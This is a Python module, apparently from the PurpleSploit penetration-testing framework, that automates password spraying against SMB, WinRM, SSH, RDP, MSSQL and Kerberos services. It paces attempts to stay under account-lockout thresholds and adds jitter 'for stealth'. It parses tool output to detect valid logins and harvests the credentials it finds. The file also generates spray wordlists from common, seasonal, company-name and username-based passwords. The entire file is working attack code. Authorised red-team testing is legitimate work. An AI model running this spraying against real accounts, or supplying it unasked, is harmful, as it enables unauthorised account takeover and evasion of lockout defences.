"""
Credential Spray Intelligence Module.

Provides smart credential spraying with lockout avoidance, spray patterns,
timing controls, and comprehensive result tracking.
"""

from dataclasses import dataclass, field
from enum import Enum
from typing import Callable
from datetime import datetime, timedelta
import time
import random
import hashlib


class SprayProtocol(Enum):
    """Supported protocols for credential spraying."""
    SMB = "smb"
    LDAP = "ldap"
    WINRM = "winrm"
    SSH = "ssh"
    RDP = "rdp"
    MSSQL = "mssql"
    KERBEROS = "kerberos"
    HTTP_BASIC = "http_basic"
    HTTP_NTLM = "http_ntlm"
    HTTP_FORM = "http_form"
    FTP = "ftp"
    OWA = "owa"
    O365 = "o365"


class SprayPattern(Enum):
    """Spray patterns for credential testing."""
    LOW_AND_SLOW = "low_and_slow"      # 1 attempt per user per interval
    DEPTH_FIRST = "depth_first"        # All passwords against 1 user
    BREADTH_FIRST = "breadth_first"    # 1 password against all users
    RANDOM = "random"                  # Random order
    SMART = "smart"                    # Adaptive based on responses


class SprayStatus(Enum):
    """Status of spray operation."""
    PENDING = "pending"
    RUNNING = "running"
    PAUSED = "paused"
    COMPLETED = "completed"
    STOPPED = "stopped"
    ERROR = "error"


class SprayAttemptOutcome(str, Enum):
    """Truthful outcome of a single authentication attempt."""

    PENDING = "pending"
    AUTHENTICATED = "authenticated"
    INVALID_CREDENTIAL = "invalid_credential"
    LOCKED_OUT = "locked_out"
    PASSWORD_CHANGE_REQUIRED = "password_change_required"
    AMBIGUOUS = "ambiguous"
    TOOL_ERROR = "tool_error"
    SKIPPED = "skipped"
    UNSUPPORTED = "unsupported"
    SIMULATED_SUCCESS = "simulated_success"
    SIMULATED_FAILURE = "simulated_failure"


@dataclass
class SprayAttempt:
    """Record of a single spray attempt."""
    username: str
    password: str
    target: str
    protocol: SprayProtocol
    timestamp: datetime = field(default_factory=datetime.now)
    success: bool = False
    error: str | None = None
    response_time: float = 0.0
    locked_out: bool = False
    needs_password_change: bool = False
    outcome: SprayAttemptOutcome = SprayAttemptOutcome.PENDING
    additional_info: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        """Convert to dictionary."""
        return {
            "username": self.username,
            "password": self.password if self.success else "***",
            "target": self.target,
            "protocol": self.protocol.value,
            "timestamp": self.timestamp.isoformat(),
            "success": self.success,
            "error": self.error,
            "response_time": self.response_time,
            "locked_out": self.locked_out,
            "needs_password_change": self.needs_password_change,
            "outcome": self.outcome.value,
            "additional_info": self.additional_info,
        }


@dataclass
class SprayResult:
    """Result of a complete spray operation."""
    id: str
    start_time: datetime
    end_time: datetime | None = None
    status: SprayStatus = SprayStatus.PENDING
    targets: list[str] = field(default_factory=list)
    protocol: SprayProtocol | None = None
    total_attempts: int = 0
    successful_attempts: int = 0
    skipped_attempts: int = 0
    locked_accounts: list[str] = field(default_factory=list)
    valid_credentials: list[dict] = field(default_factory=list)
    attempts: list[SprayAttempt] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        """Convert to dictionary."""
        return {
            "id": self.id,
            "start_time": self.start_time.isoformat(),
            "end_time": self.end_time.isoformat() if self.end_time else None,
            "status": self.status.value,
            "targets": self.targets,
            "protocol": self.protocol.value if self.protocol else None,
            "total_attempts": self.total_attempts,
            "successful_attempts": self.successful_attempts,
            "skipped_attempts": self.skipped_attempts,
            "locked_accounts": self.locked_accounts,
            "valid_credentials": self.valid_credentials,
            "errors": self.errors,
        }


@dataclass
class LockoutPolicy:
    """Account lockout policy configuration."""
    threshold: int = 5             # Attempts before lockout
    observation_window: int = 30   # Minutes to track attempts
    lockout_duration: int = 30     # Minutes of lockout
    safe_attempts: int = 3         # Safe attempts before threshold
    reset_after: int = 60          # Minutes before counter resets

    @classmethod
    def from_ad_policy(cls, policy: dict) -> "LockoutPolicy":
        """Create from Active Directory policy."""
        return cls(
            threshold=policy.get("lockoutThreshold", 5),
            observation_window=policy.get("lockoutObservationWindow", 30),
            lockout_duration=policy.get("lockoutDuration", 30),
            safe_attempts=max(1, policy.get("lockoutThreshold", 5) - 2),
        )

    @classmethod
    def conservative(cls) -> "LockoutPolicy":
        """Create conservative policy for unknown environments."""
        return cls(
            threshold=3,
            observation_window=30,
            lockout_duration=60,
            safe_attempts=1,
            reset_after=60,
        )


class CredentialSpray:
    """
    Intelligent credential spraying with lockout protection.

    Features:
    - Multiple spray patterns
    - Lockout policy awareness
    - Timing controls and jitter
    - Per-user attempt tracking
    - Parallel spraying with rate limiting
    - Result aggregation and reporting
    """

    def __init__(
        self,
        framework=None,
        lockout_policy: LockoutPolicy | None = None,
    ):
        """
        Initialize credential spray manager.

        Args:
            framework: Reference to PurpleSploit framework
            lockout_policy: Lockout policy to respect
        """
        self.framework = framework
        self.lockout_policy = lockout_policy or LockoutPolicy.conservative()

        # State
        self.results: list[SprayResult] = []
        self._current_result: SprayResult | None = None
        self._stop_requested: bool = False
        self._pause_requested: bool = False

        # Per-user attempt tracking
        self._user_attempts: dict[str, list[datetime]] = {}
        self._locked_users: set[str] = set()
        self._module_cache: dict[SprayProtocol, object] = {}

        # Callbacks
        self.on_attempt: Callable[[SprayAttempt], None] | None = None
        self.on_success: Callable[[SprayAttempt], None] | None = None
        self.on_lockout: Callable[[str], None] | None = None
        self.on_progress: Callable[[int, int], None] | None = None
        self.on_complete: Callable[[SprayResult], None] | None = None

        # Module mapping for protocols
        self._protocol_modules = {
            SprayProtocol.SMB: "network/nxc_smb",
            SprayProtocol.WINRM: "network/nxc_winrm",
            SprayProtocol.SSH: "network/nxc_ssh",
            SprayProtocol.RDP: "network/nxc_rdp",
            SprayProtocol.MSSQL: "network/nxc_mssql",
            SprayProtocol.KERBEROS: "ad/kerbrute",
        }
        self._protocol_operations = {
            protocol: "Test Authentication" for protocol in self._protocol_modules
        }
        self._protocol_operations[SprayProtocol.KERBEROS] = "Password Spray"
        self._protocol_target_options = {
            protocol: "RHOST" for protocol in self._protocol_modules
        }
        self._protocol_target_options[SprayProtocol.KERBEROS] = "DC_IP"

    def set_lockout_policy(self, policy: LockoutPolicy):
        """Update lockout policy."""
        self.lockout_policy = policy

    def detect_lockout_policy(self, target: str, domain: str | None = None) -> LockoutPolicy | None:
        """
        Attempt to detect lockout policy from target.

        Returns detected policy or None if unable to detect.
        """
        # This would integrate with LDAP/AD enumeration
        # For now, return conservative default
        return LockoutPolicy.conservative()

    def _can_attempt_user(self, username: str) -> bool:
        """Check if we can safely attempt this user."""
        if username in self._locked_users:
            return False

        # Get recent attempts for this user
        now = datetime.now()
        window_start = now - timedelta(minutes=self.lockout_policy.observation_window)

        attempts = self._user_attempts.get(username, [])
        recent_attempts = [a for a in attempts if a > window_start]

        return len(recent_attempts) < self.lockout_policy.safe_attempts

    def _record_attempt(self, username: str, success: bool, locked: bool):
        """Record an attempt for a user."""
        if username not in self._user_attempts:
            self._user_attempts[username] = []

        self._user_attempts[username].append(datetime.now())

        if locked:
            self._locked_users.add(username)

        # Clean old attempts
        cutoff = datetime.now() - timedelta(minutes=self.lockout_policy.reset_after)
        self._user_attempts[username] = [
            a for a in self._user_attempts[username] if a > cutoff
        ]

    def _calculate_delay(
        self,
        pattern: SprayPattern,
        base_delay: float = 0.0,
        jitter: float = 0.0,
    ) -> float:
        """Calculate delay between attempts."""
        if pattern == SprayPattern.LOW_AND_SLOW:
            # Long delay for stealth
            delay = max(base_delay, 30.0)
        elif pattern == SprayPattern.RANDOM:
            delay = random.uniform(base_delay, base_delay * 2)
        else:
            delay = base_delay

        if jitter > 0:
            delay += random.uniform(0, jitter)

        return delay

    def _generate_attempt_order(
        self,
        users: list[str],
        passwords: list[str],
        pattern: SprayPattern,
    ) -> list[tuple[str, str]]:
        """Generate ordered list of (user, password) attempts."""
        attempts = []

        if pattern == SprayPattern.BREADTH_FIRST:
            # Try each password against all users before next password
            for password in passwords:
                for user in users:
                    attempts.append((user, password))

        elif pattern == SprayPattern.DEPTH_FIRST:
            # Try all passwords against each user before next user
            for user in users:
                for password in passwords:
                    attempts.append((user, password))

        elif pattern == SprayPattern.RANDOM:
            # Random order
            for user in users:
                for password in passwords:
                    attempts.append((user, password))
            random.shuffle(attempts)

        elif pattern == SprayPattern.LOW_AND_SLOW:
            # Breadth-first with significant delays (handled in spray loop)
            for password in passwords:
                for user in users:
                    attempts.append((user, password))

        elif pattern == SprayPattern.SMART:
            # Start breadth-first, adapt based on lockouts
            for password in passwords:
                for user in users:
                    attempts.append((user, password))

        return attempts

    def spray(
        self,
        targets: list[str] | str,
        users: list[str],
        passwords: list[str],
        protocol: SprayProtocol | str = SprayProtocol.SMB,
        pattern: SprayPattern = SprayPattern.BREADTH_FIRST,
        domain: str | None = None,
        delay: float = 0.0,
        jitter: float = 0.0,
        stop_on_success: bool = False,
        max_lockouts: int = 3,
    ) -> SprayResult:
        """
        Execute credential spray operation.

        Args:
            targets: Target host(s) to spray
            users: List of usernames to try
            passwords: List of passwords to try
            protocol: Protocol to use for authentication
            pattern: Spray pattern to follow
            domain: Domain for authentication
            delay: Base delay between attempts in seconds
            jitter: Random jitter to add to delay
            stop_on_success: Stop when first valid credential found
            max_lockouts: Stop if this many lockouts detected

        Returns:
            SprayResult with all attempt details
        """
        # Normalize inputs
        if isinstance(targets, str):
            targets = [targets]
        if isinstance(protocol, str):
            protocol = SprayProtocol(protocol.lower())

        # Generate result ID
        digest = hashlib.md5(
            f'{targets}{users}{datetime.now()}'.encode(), usedforsecurity=False,
        ).hexdigest()[:12]
        result_id = f"spray:{digest}"

        # Initialize result
        result = SprayResult(
            id=result_id,
            start_time=datetime.now(),
            status=SprayStatus.RUNNING,
            targets=targets,
            protocol=protocol,
        )
        self._current_result = result
        self._stop_requested = False
        self._pause_requested = False

        # Reject unsupported framework protocols before producing one identical
        # tool error for every user/password pair. Simulation mode intentionally
        # remains protocol-agnostic for local UI demonstrations.
        if self.framework and protocol not in self._protocol_modules:
            result.status = SprayStatus.ERROR
            result.end_time = datetime.now()
            result.errors.append(f"Unsupported protocol: {protocol.value}")
            self.results.append(result)
            self._current_result = None
            if self.on_complete:
                self.on_complete(result)
            return result
        if self.framework and protocol is SprayProtocol.KERBEROS and not domain:
            result.status = SprayStatus.ERROR
            result.end_time = datetime.now()
            result.errors.append("Kerberos spraying requires a domain")
            self.results.append(result)
            self._current_result = None
            if self.on_complete:
                self.on_complete(result)
            return result

        self._module_cache = {}

        # Generate attempt order
        attempt_order = self._generate_attempt_order(users, passwords, pattern)
        total_attempts = len(attempt_order) * len(targets)

        completed = 0
        lockout_count = 0

        try:
            for target in targets:
                if self._stop_requested:
                    break

                for username, password in attempt_order:
                    if self._stop_requested:
                        break

                    # Handle pause
                    while self._pause_requested:
                        time.sleep(0.5)
                        if self._stop_requested:
                            break

                    # Check if user can be attempted
                    if not self._can_attempt_user(username):
                        skipped = SprayAttempt(
                            username=username,
                            password=password,
                            target=target,
                            protocol=protocol,
                            outcome=SprayAttemptOutcome.SKIPPED,
                            additional_info={
                                "reason": "attempt policy did not permit another attempt"
                            },
                        )
                        result.attempts.append(skipped)
                        result.skipped_attempts += 1
                        completed += 1
                        if self.on_attempt:
                            self.on_attempt(skipped)
                        if self.on_progress:
                            self.on_progress(completed, total_attempts)
                        continue

                    # Calculate delay
                    sleep_time = self._calculate_delay(pattern, delay, jitter)
                    if sleep_time > 0:
                        time.sleep(sleep_time)

                    # Execute attempt
                    attempt = self._execute_attempt(
                        target=target,
                        username=username,
                        password=password,
                        protocol=protocol,
                        domain=domain,
                    )

                    result.attempts.append(attempt)
                    result.total_attempts += 1
                    completed += 1

                    # Record for lockout tracking
                    self._record_attempt(username, attempt.success, attempt.locked_out)

                    # Fire callbacks
                    if self.on_attempt:
                        self.on_attempt(attempt)

                    if self.on_progress:
                        self.on_progress(completed, total_attempts)

                    if attempt.success:
                        result.successful_attempts += 1
                        result.valid_credentials.append({
                            "username": username,
                            "password": password,
                            "domain": domain,
                            "target": target,
                            "protocol": protocol.value,
                        })

                        if self.on_success:
                            self.on_success(attempt)

                        if stop_on_success:
                            self._stop_requested = True

                    if attempt.locked_out:
                        if username not in result.locked_accounts:
                            result.locked_accounts.append(username)
                            lockout_count += 1

                            if self.on_lockout:
                                self.on_lockout(username)

                            if lockout_count >= max_lockouts:
                                result.errors.append(f"Stopped: {lockout_count} lockouts detected")
                                self._stop_requested = True

        except Exception as e:
            result.errors.append(str(e))
            result.status = SprayStatus.ERROR

        # Finalize result
        result.end_time = datetime.now()
        if result.status == SprayStatus.RUNNING:
            result.status = SprayStatus.COMPLETED if not self._stop_requested else SprayStatus.STOPPED

        self.results.append(result)
        self._current_result = None
        self._module_cache = {}

        if self.on_complete:
            self.on_complete(result)

        return result

    def _execute_attempt(
        self,
        target: str,
        username: str,
        password: str,
        protocol: SprayProtocol,
        domain: str | None = None,
    ) -> SprayAttempt:
        """Execute a single authentication attempt."""
        start_time = time.time()

        attempt = SprayAttempt(
            username=username,
            password=password,
            target=target,
            protocol=protocol,
        )

        try:
            if self.framework:
                # Use framework module for authentication
                success, locked, info = self._execute_via_framework(
                    target, username, password, protocol, domain
                )
                attempt.success = success
                attempt.locked_out = locked
                attempt.additional_info = info or {}
                raw_outcome = attempt.additional_info.pop("_spray_outcome", None)
                if raw_outcome:
                    attempt.outcome = SprayAttemptOutcome(raw_outcome)
                elif locked:
                    attempt.outcome = SprayAttemptOutcome.LOCKED_OUT
                elif success:
                    attempt.outcome = SprayAttemptOutcome.AUTHENTICATED
                elif attempt.additional_info.get("error"):
                    attempt.outcome = SprayAttemptOutcome.TOOL_ERROR
                else:
                    attempt.outcome = SprayAttemptOutcome.AMBIGUOUS
                if not success and attempt.additional_info.get("error"):
                    attempt.error = str(attempt.additional_info["error"])
            else:
                # Simulation mode for testing
                attempt.success = self._simulate_attempt(username, password)
                attempt.locked_out = False
                attempt.outcome = (
                    SprayAttemptOutcome.SIMULATED_SUCCESS
                    if attempt.success
                    else SprayAttemptOutcome.SIMULATED_FAILURE
                )

        except Exception as e:
            attempt.error = str(e)
            attempt.success = False
            attempt.outcome = SprayAttemptOutcome.TOOL_ERROR

        attempt.response_time = time.time() - start_time

        return attempt

    def _execute_via_framework(
        self,
        target: str,
        username: str,
        password: str,
        protocol: SprayProtocol,
        domain: str | None,
    ) -> tuple[bool, bool, dict | None]:
        """Execute attempt using framework module."""
        module_path = self._protocol_modules.get(protocol)
        if not module_path:
            return False, False, {"error": f"Unsupported protocol: {protocol.value}"}

        try:
            # Reuse one non-session-mutating module instance per protocol. Each
            # attempt still receives its own execution record, but the current
            # interactive module and module history are not flooded.
            module = self._module_cache.get(protocol)
            if module is None:
                instantiate = getattr(self.framework, "instantiate_module", None)
                if callable(instantiate):
                    module = instantiate(module_path)
                else:
                    metadata = self.framework.get_module(module_path)
                    module = metadata.instance(self.framework) if metadata else None
                if module is not None:
                    self._module_cache[protocol] = module
            if not module:
                return False, False, {"error": f"Module not found: {module_path}"}

            # Configure the canonical option names exposed by the NXC modules.
            available_options = module.show_options()
            option_values = {
                self._protocol_target_options[protocol]: target,
                "USERNAME": username,
                "PASSWORD": password,
            }
            for option_name, option_value in option_values.items():
                if option_name not in available_options:
                    return False, False, {
                        "error": f"Module {module_path} does not expose {option_name}"
                    }
                if not module.set_option(option_name, option_value):
                    return False, False, {
                        "error": f"Unable to set {option_name} on module {module_path}"
                    }

            # Explicitly pin every credential-bearing input, including absent
            # HASH/DOMAIN values, so session context cannot replace the secret
            # being tested or silently change its authentication realm.
            pinned_options = set(option_values)
            if "HASH" in available_options:
                if not module.set_option("HASH", None):
                    return False, False, {
                        "error": f"Unable to clear HASH on module {module_path}"
                    }
                pinned_options.add("HASH")
            if "DOMAIN" in available_options:
                if not module.set_option("DOMAIN", domain):
                    return False, False, {
                        "error": f"Unable to set DOMAIN on module {module_path}"
                    }
                pinned_options.add("DOMAIN")
            module.options_locked.update(pinned_options)

            operation_name = self._protocol_operations[protocol]
            finder = getattr(self.framework, "find_operation", None)
            if callable(finder):
                auth_operation = finder(module, operation_name)
            else:
                operations = module.get_operations()
                auth_operation = next(
                    (
                        operation
                        for operation in operations
                        if operation.get("name", "").casefold()
                        == operation_name.casefold()
                    ),
                    None,
                )
            if auth_operation is None:
                return False, False, {
                    "error": f"Authentication operation not found: {module_path}/{operation_name}"
                }

            # Run through the framework so validation, redaction, audit storage,
            # and the operation handler contract are consistently applied.
            result = self.framework.run_operation(module, auth_operation)
            if not isinstance(result, dict):
                return False, False, {
                    "error": "Authentication operation returned a non-dictionary result"
                }

            success, locked, outcome = self._classify_auth_result(result)
            result = dict(result)
            result["_spray_outcome"] = outcome.value

            return success, locked, result

        except Exception as e:
            return False, False, {"error": str(e)}

    @staticmethod
    def _interpret_auth_result(result: dict) -> tuple[bool, bool]:
        """Interpret an authentication operation result.

        NXC's process exit status indicates whether the tool ran, not whether
        credentials were accepted. Prefer explicit structured authentication
        fields, then recognize the stable success/failure markers emitted by
        NXC and common authentication handlers. Ambiguous successful process
        execution is treated as a failed credential rather than a false
        positive.
        """
        success, locked, _ = CredentialSpray._classify_auth_result(result)
        return success, locked

    @staticmethod
    def _classify_auth_result(
        result: dict,
    ) -> tuple[bool, bool, SprayAttemptOutcome]:
        """Classify process and authentication state without false positives."""
        text_values = []
        for key in ("stdout", "stderr", "output", "message", "error"):
            value = result.get(key)
            if value not in (None, ""):
                text_values.append(str(value))

        data = result.get("data")
        if isinstance(data, dict):
            for key in ("stdout", "stderr", "output", "message", "error"):
                value = data.get(key)
                if value not in (None, ""):
                    text_values.append(str(value))

        output = "\n".join(text_values).casefold()
        explicit_locked = result.get("locked_out")
        if not isinstance(explicit_locked, bool) and isinstance(data, dict):
            explicit_locked = data.get("locked_out")
        observation_auth = []
        observation_locked = []
        for observation in result.get("observations", []):
            if not isinstance(observation, dict):
                continue
            attributes = observation.get("attributes")
            if not isinstance(attributes, dict):
                attributes = observation
            if isinstance(attributes.get("authenticated"), bool):
                observation_auth.append(attributes["authenticated"])
            if isinstance(attributes.get("locked_out"), bool):
                observation_locked.append(attributes["locked_out"])
        lockout_markers = (
            "status_account_locked_out",
            "account locked out",
            "account is locked",
            "account has been locked",
        )
        locked = (
            explicit_locked is True
            or any(observation_locked)
            or any(marker in output for marker in lockout_markers)
        )

        if locked:
            return False, True, SprayAttemptOutcome.LOCKED_OUT
        # A failed process cannot establish valid authentication.
        if result.get("success") is not True:
            return False, False, SprayAttemptOutcome.TOOL_ERROR

        explicit_auth = result.get("authenticated")
        if not isinstance(explicit_auth, bool) and isinstance(data, dict):
            explicit_auth = data.get("authenticated")
        if not isinstance(explicit_auth, bool) and observation_auth:
            explicit_auth = any(observation_auth)

        failure_markers = (
            "[-]",
            "status_logon_failure",
            "status_wrong_password",
            "logon failure",
            "login failed",
            "authentication failed",
            "invalid credential",
            "access denied",
        )
        if any(marker in output for marker in failure_markers):
            return False, False, SprayAttemptOutcome.INVALID_CREDENTIAL

        if isinstance(explicit_auth, bool):
            return (
                explicit_auth,
                False,
                SprayAttemptOutcome.AUTHENTICATED
                if explicit_auth
                else SprayAttemptOutcome.INVALID_CREDENTIAL,
            )

        success_markers = (
            "[+]",
            "pwn3d!",
            "authentication succeeded",
            "authenticated successfully",
            "login successful",
            "status_password_must_change",
            "status_password_expired",
        )
        authenticated = any(marker in output for marker in success_markers)
        if authenticated:
            password_change = any(
                marker in output
                for marker in ("status_password_must_change", "status_password_expired")
            )
            return (
                True,
                False,
                SprayAttemptOutcome.PASSWORD_CHANGE_REQUIRED
                if password_change
                else SprayAttemptOutcome.AUTHENTICATED,
            )
        return False, False, SprayAttemptOutcome.AMBIGUOUS

    def _simulate_attempt(self, username: str, password: str) -> bool:
        """Simulate authentication attempt for testing."""
        # Simple simulation: specific combos succeed
        valid_pairs = [
            ("admin", "admin"),
            ("administrator", "P@ssw0rd"),
            ("user", "password123"),
        ]
        return (username.lower(), password) in valid_pairs

    def stop(self):
        """Stop current spray operation."""
        self._stop_requested = True

    def pause(self):
        """Pause current spray operation."""
        self._pause_requested = True

    def resume(self):
        """Resume paused spray operation."""
        self._pause_requested = False

    def get_status(self) -> dict:
        """Get current spray status."""
        if self._current_result:
            return {
                "status": self._current_result.status.value,
                "total_attempts": self._current_result.total_attempts,
                "successful": self._current_result.successful_attempts,
                "locked_accounts": len(self._current_result.locked_accounts),
                "valid_credentials": len(self._current_result.valid_credentials),
            }
        return {"status": "idle"}

    def get_statistics(self) -> dict:
        """Get overall spray statistics."""
        total_attempts = sum(r.total_attempts for r in self.results)
        total_success = sum(r.successful_attempts for r in self.results)
        total_locked = sum(len(r.locked_accounts) for r in self.results)

        all_creds = []
        for r in self.results:
            all_creds.extend(r.valid_credentials)

        return {
            "total_sprays": len(self.results),
            "total_attempts": total_attempts,
            "successful_attempts": total_success,
            "success_rate": (total_success / total_attempts * 100) if total_attempts > 0 else 0,
            "locked_accounts": total_locked,
            "unique_valid_credentials": len(set(
                f"{c.get('domain', '')}\\{c['username']}:{c['password']}"
                for c in all_creds
            )),
            "valid_credentials": all_creds,
        }

    def clear_history(self):
        """Clear spray history."""
        self.results.clear()
        self._user_attempts.clear()
        self._locked_users.clear()


class PasswordGenerator:
    """Generate common passwords and variations for spraying."""

    # Common base passwords
    COMMON_PASSWORDS = [
        "password", "Password", "Password1", "Password123",
        "Welcome1", "Welcome123", "Welcome!",
        "Summer2024", "Winter2024", "Spring2024", "Fall2024",
        "January2024", "February2024", "March2024",
        "P@ssw0rd", "P@ssword1", "Passw0rd!",
        "Admin123", "admin123", "Administrator1",
        "Qwerty123", "Letmein123", "Changeme1",
    ]

    # Season patterns
    SEASONS = ["Spring", "Summer", "Fall", "Winter"]

    # Common substitutions
    SUBSTITUTIONS = {
        "a": ["@", "4"],
        "e": ["3"],
        "i": ["1", "!"],
        "o": ["0"],
        "s": ["$", "5"],
    }

    @classmethod
    def generate_seasonal(cls, year: int | None = None) -> list[str]:
        """Generate seasonal password variations."""
        if year is None:
            year = datetime.now().year

        passwords = []
        for season in cls.SEASONS:
            passwords.extend([
                f"{season}{year}",
                f"{season}{year}!",
                f"{season}{year}@",
                f"{season.lower()}{year}",
            ])

        # Add month-based
        months = ["January", "February", "March", "April", "May", "June",
                  "July", "August", "September", "October", "November", "December"]
        for month in months:
            passwords.extend([
                f"{month}{year}",
                f"{month}{year}!",
                f"{month[:3]}{year}",
            ])

        return passwords

    @classmethod
    def generate_company_variants(cls, company_name: str) -> list[str]:
        """Generate password variations based on company name."""
        name = company_name.strip()
        passwords = []

        # Basic variations
        passwords.extend([
            name,
            f"{name}1",
            f"{name}123",
            f"{name}!",
            f"{name}2024",
            f"{name}@123",
            name.lower(),
            f"{name.lower()}1",
            f"{name.lower()}123",
            name.upper(),
            name.capitalize(),
        ])

        # With leet speak
        leet_name = cls._apply_substitutions(name)
        passwords.extend([
            leet_name,
            f"{leet_name}1",
            f"{leet_name}123",
        ])

        return list(set(passwords))

    @classmethod
    def _apply_substitutions(cls, text: str) -> str:
        """Apply common character substitutions."""
        result = text
        for char, subs in cls.SUBSTITUTIONS.items():
            if char in result.lower():
                result = result.replace(char, subs[0])
                result = result.replace(char.upper(), subs[0])
        return result

    @classmethod
    def generate_username_based(cls, username: str) -> list[str]:
        """Generate passwords based on username."""
        passwords = []

        # Common patterns
        patterns = [
            f"{username}1",
            f"{username}123",
            f"{username}!",
            f"{username}@123",
            f"{username}2024",
            f"{username.capitalize()}1",
            f"{username.capitalize()}123",
        ]
        passwords.extend(patterns)

        return list(set(passwords))

    @classmethod
    def get_top_passwords(cls, count: int = 20) -> list[str]:
        """Get top N common passwords."""
        return cls.COMMON_PASSWORDS[:count]

    @classmethod
    def build_wordlist(
        cls,
        include_common: bool = True,
        include_seasonal: bool = True,
        company_name: str | None = None,
        usernames: list[str] | None = None,
        year: int | None = None,
    ) -> list[str]:
        """Build comprehensive password wordlist."""
        passwords = []

        if include_common:
            passwords.extend(cls.COMMON_PASSWORDS)

        if include_seasonal:
            passwords.extend(cls.generate_seasonal(year))

        if company_name:
            passwords.extend(cls.generate_company_variants(company_name))

        if usernames:
            for username in usernames:
                passwords.extend(cls.generate_username_based(username))

        return list(set(passwords))


def create_credential_spray(
    framework=None,
    lockout_policy: LockoutPolicy | None = None,
) -> CredentialSpray:
    """Factory function to create credential spray manager."""
    return CredentialSpray(framework, lockout_policy)
